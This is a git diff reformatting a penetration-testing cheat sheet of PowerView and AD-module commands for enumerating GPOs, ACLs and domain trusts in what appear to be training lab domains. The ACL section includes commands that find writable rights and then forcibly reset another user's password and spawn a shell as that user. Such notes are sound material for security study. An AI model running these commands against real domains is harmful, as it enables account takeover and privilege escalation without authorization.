@@ -168,10 +168,8 @@ C:> Invoke-FileFinder -Verbose
 
 # Get Fileservers on Domain
 C:> Get-NetFileServer
-
 ```
 - GPO Enumeration
----
 ```powershell
 # GPO List in the Current Domain
 C:> Get-DomainGPO
@@ -207,93 +205,63 @@ C:> Get-DomainGPO -Identity "{AB306569-220D-43FF-B03B-83E8F4EF8081}"
 C:>  Get-DomainOU -Identity "StudentMachines"| %{Get-DomainComputer -SearchBase $_.distinguishedname}
 ```
 
-
-### ACL Enumeration
----
-#### ACL Associated to Specified Object
+- ACL Enumeration
 ```powershell
+# ACL Associated to Specified Object
 C:> Get-DomainObjectAcl -SamAccountName user -ResolveGUIDs
-```
-#### Get ACL Associated with the Specified PRefix to Use for Search
-```powershell
+
+# Get ACL Associated with the Specified PRefix to Use for Search
 C:> Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
-```
-#### Enumerate ACL using AD Module. Without Resolving GUIDs
-```powershell
+
+# Enumerate ACL using AD Module. Without Resolving GUIDs
 C:> (Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access
-```
-#### Search for interesting ACEs
-```powershell
+
+# Search for interesting ACEs
 C:> Find-InterestingDomainAcl -ResolveGUIDs
-```
-#### Get ACL Associated With Specified Path
-```powershell
+
+# Get ACL Associated With Specified Path
 C:> Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
-```
-#### Use Invoke-ACLScanner
-To get the ActiveDirectory Rights for a defined group on user:
-```powershell
+
+# Use Invoke-ACLScanner: To get the ActiveDirectory Rights for a defined group on user:
 C:> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "GROUPNAME"} | select Objectdn,identityreferencename,activedirectoryrights
-```
-#### Check if Current User has GenericAll Rights on the AD Object for USER
-Interestig to see the chance to change password for USER3
-```powershell
+
+# Check if Current User has GenericAll Rights on the AD Object for USER. Interestig to see the chance to change password for USER3
 C:> Get-ObjectAcl -SamAccountName USER -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
-```
-#### Check if USER can Force Password Change on USER2
-Usefull to change user password
-```powerview
+
+# Check if USER can Force Password Change on USER2. Usefull to change user password
 C:> Get-ObjectAcl -SamAccountName USER2 -ResolveGUIDs | ? {$_.IdentityReference -eq "DOMAIN\USER"}
+###  If The USER2 has the `User-Force-Change-Password` in the ObjectType property for USER on it's ACL, password can be changed
+     C:> Set-DomainUserPassword -Identity delegate -Verbose
+     C:> runas /user:DOMAIN\USER2 cmd
+     [Asks for a password and then spawns the shell] 
+###  Also password can be changed like this
+     C:> Set-DomainUserPassword -Identity USER2 -AccountPassword (ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force) -Verbose
 ```
-If The USER2 has the `User-Force-Change-Password` in the ObjectType property for USER on it's ACL, password can be changed
-```powerview
-C:> Set-DomainUserPassword -Identity delegate -Verbose
-C:> runas /user:DOMAIN\USER2 cmd
-[Asks for a password and then spawns the shell] 
-```
-Also password can be changed like this
-```powerview
-C:> Set-DomainUserPassword -Identity USER2 -AccountPassword (ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force) -Verbose
-```
-### Domain Trusts Enumeration
----
-#### Enumerate Domain Trust Relationships of the Current User
+- Domain Trusts Enumeration
 ```powershell
+# Enumerate Domain Trust Relationships of the Current User
 C:> Get-NetDomainTrust
-```
-#### Domain Trust Mapping
-```powershell
+
+# Domain Trust Mapping
 C:> Get-DomainTrust
 C:> Get-DomainTrust -Domain us.dollarcorp.moneycorp.local
-C:> Get-ADTrust
-C:> Get-ADTrust -Identity us.dollarcorp.moneycorp.local
-```
-#### External Trust for Domain
-Are those domains whose `TrustAttributes` equals to `"FILTER_SIDS"`
-```powershell
-C:> Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
-```
-#### Get All Domains of the Forest for Current User
-```powerview
-C:> Get-NetForestDomain
-```
-#### Forest Mapping
-```powershell
-C:> Get-NetForestTrust
-```
 
-- Get All Global Catalogs for Current Forest
-```powershell
+# External Trust for Domain. Are those domains whose `TrustAttributes` equals to `"FILTER_SIDS"`
+C:> Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
+
+# Get All Domains of the Forest for Current User
+C:> Get-NetForestDomain
+
+# Forest Mapping
+C:> Get-NetForestTrust
+
+# Get All Global Catalogs for Current Forest
 C:> Get-ForestGlobalCatalog
 C:> Get-ForestGlobalCatalog -Forest eurocorp.local
-C:> Get-ADForest @ select -ExpandProperty GlobalCatalogs
-```
 
-- Map Trusts of a Forest
-```powershell
+# Map Trusts of a Forest
 C:> Get-ForestTrust
 C:> Get-ForestTrust -Forest eurocorp.local
-C:> Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
 ```
 ### User Hunting
 ---
